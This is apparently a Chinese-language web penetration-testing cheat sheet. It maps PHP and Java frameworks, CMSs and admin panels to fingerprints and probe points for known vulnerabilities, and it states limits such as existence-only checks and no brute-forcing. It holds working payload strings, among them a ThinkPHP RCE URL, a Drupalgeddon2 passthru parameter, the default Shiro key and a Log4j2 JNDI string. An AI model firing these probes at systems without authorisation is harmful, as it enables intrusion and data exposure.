# 框架与中间件指纹 / 已知问题速查

> 用法：先定指纹（响应头、错误页、静态路径、Cookie 名），再打对应检测点。**只做存在性验证**，不跑破坏性利用链。

## PHP 系

### ThinkPHP（3/5/6）
- 指纹：`X-Powered-By: ThinkPHP`、错误页「系统发生错误」、URL `?s=/`；`/index.php?s=index/index`。
- 检测点：5.0.x RCE（`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo`）、5.1.x 多语言 RCE、3.2 debug 日志泄露 `/Application/Runtime/Logs/`。
- 判据：命令执行结果回显或写入 `public/` 的可访问文件（仅验证，不写入持久化内容）。

### Laravel
- 指纹：`laravel_session` cookie、`XSRF-TOKEN`、错误页带 `Whoops`。
- 检测点：`APP_KEY` 泄露后的反序列化 RCE（`.env` 可读时）、`/telescope`、`/horizon` 未授权、debug 模式堆栈泄露（`APP_DEBUG=true`）。

### CodeIgniter（CI2 / CI3）
- 指纹：`csrf_cookie_xw` / `csrf_token_xw` 这类自定义 CSRF、`MYSESSNAME`、路由 `/index.php/{ctrl}/{act}`、错误页 `A Database Error Occurred`。
- 检测点：`/application/config/database.php` 直读（多为 403）、`/system/`、`?debug=1` 开 debug 时的 SQL 报错、`$this->db->query` 拼接导致的注入。
- 特征：`/core/{Ctrl}/{Act}` 自研路由 + `PHPSESSID` → 按自研框架处理，重点打登录与后台接口。

### WordPress / Drupal / Joomla
- WP：`/wp-json/wp/v2/users` 用户枚举、`/wp-login.php` 无锁定、插件版本（`/wp-content/plugins/*/readme.txt`）、`xmlrpc.php` 放大。
- Drupal：`/CHANGELOG.txt` 版本、`user/register`、Drupalgeddon2（`?q=user/password&name[#post_render][]=passthru`）。

## Java 系

### Spring Boot
- 指纹：`Whitelabel Error Page`、`/actuator`。
- 检测点：`/actuator/env`、`/actuator/heapdump`、`/actuator/mappings`、`/actuator/gateway/routes`（RCE）、`/jolokia` 未授权。
- 判据：能读到配置/环境变量即信息泄露；heapdump 可提取凭据。

### Shiro
- 指纹：`rememberMe=deleteMe` 响应头。
- 检测点：默认 `kPH+bIxk5D2deZiIxcaaaA==` 密钥 → 反序列化；用 DNS 回连验证，不执行破坏性命令。

### Fastjson / Log4j2 / Jackson
- Fastjson：JSON 入参处 `@type`；Log4j2：任何被记录的字段（UA、参数）打 `${jndi:dns://...}`；Jackson：`enableDefaultTyping` 时 `["类",{}]`。
- 一律用 **DNS 外带** 验证，绝不加载远程可执行类。

## 中间件 / 面板

| 目标 | 检测请求 | 判据 |
|---|---|---|
| phpMyAdmin | `/phpmyadmin/`、`/pma/` | 登录页可访问（弱口令另测） |
| Adminer | `/adminer.php` | 单文件数据库面板 |
| Swagger | `/swagger-ui.html`、`/v2/api-docs`、`/vue/` | 接口全量泄露，可直接找未授权 |
| Nacos | `/nacos/v1/auth/users` | 默认 nacos/nacos |
| Jenkins | `/script`、`/manage` | 未授权脚本控制台 = RCE |
| Redis/ES/Mongo | 端口 6379/9200/27017 直连 | 未授权访问 |
| UEditor | `/ueditor/php/controller.php?action=config` | 未授权上传 / SSRF（`action=catchimage`） |
| .git | `/.git/HEAD` → `refs/heads/master` | 源码可还原（git-dumper） |

> 注意：面板/中间件未授权属于高危，但**登录尝试一律不做**（属口令爆破，平台多禁止且违法风险高）；只证明「页面可达、无鉴权」。

## 指纹识别执行方式

```bash
whatweb -a 3 https://HOST          # 快速指纹
curl -sI https://HOST | grep -iE "server|x-powered-by|set-cookie|via|x-aspnet"
curl -s https://HOST/robots.txt https://HOST/sitemap.xml
```
> 判读：`Set-Cookie` 名（`PHPSESSID`/`JSESSIONID`/`laravel_session`/`ASP.NET_SessionId`）是最快的语言判定。
